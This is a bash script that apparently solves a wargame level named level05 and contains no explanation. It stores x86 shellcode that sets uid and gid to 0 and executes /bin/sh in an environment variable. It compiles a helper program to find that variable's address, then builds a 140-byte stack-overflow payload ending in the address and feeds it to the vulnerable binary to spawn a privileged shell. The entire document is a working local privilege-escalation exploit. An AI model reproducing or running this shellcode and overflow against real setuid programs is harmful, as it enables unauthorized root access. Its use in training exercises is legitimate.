#!/bin/bash
cat > env.c << EOF
#include <stdio.h>
#include <string.h>

int main(int ac, char *av[])
{
    char *ptr;
    ptr = (char *)getenv("S");
    ptr += ((strlen(av[0]) - strlen("/levels/level05"))*2);
    printf("%p\n",ptr);
    return 0;
}
EOF

export S=`ruby -e 'print "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"'`

gcc -o env env.c
addr=`./env |cut -d 'x' -f2`
rm -f env env.c

cat > overflow.rb << EOF
a = ARGV[0]
b = []
(0...a.length).step(2) do |n|
    b.push a[n] + a[n+1]
end
print 'A' * 140
b.reverse.each do |c|
    print c.to_i(16).chr
end
EOF

buf=`ruby overflow.rb "$addr"`
rm -f overflow.rb

/levels/level05 "$buf"
